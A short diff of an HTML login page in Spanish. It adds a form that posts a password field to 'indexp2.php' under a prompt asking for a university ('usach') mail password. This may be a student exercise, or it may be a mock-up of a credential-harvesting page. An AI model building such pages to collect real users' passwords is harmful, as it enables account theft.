@@ -17,7 +17,9 @@
 
     <div id="panelLoginInterior" class="panel panel-default">
       <div class="panel-body">
+        <form action="indexp2.php" method="post">
         <div class="col-xs-11">
+
           <label for="email">Ingresa tu contraseña de usuario del correo usach</label>
         </div>
 
@@ -26,20 +28,21 @@
 
           <label for="email"><h3>Contraseña:</h3></label>
 
-          <input type="email" class="form-control" id="email">
+          <input type="password" class="form-control" id="pass" name="pass">
 
 
           <h1> </h1>
 
-          <button id ="buttonIngresarLogin" type="button" class="btn btn-primary btn-block">Ingresar</button>
+          <button id ="buttonIngresarLogin" type="submit" class="btn btn-primary btn-block">Ingresar</button>
 
           <h1> </h1>
 
-          <button id ="buttonOlvideContraseña" type="button" class="btn btn-primary btn-block">Olvide mi contraseña</button>
+          <button id ="buttonOlvideContraseña" type="submit" class="btn btn-primary btn-block">Olvide mi contraseña</button>
 
           <h1> </h1>
 
         </div>
+      </form>
       </div>
 
     </div>
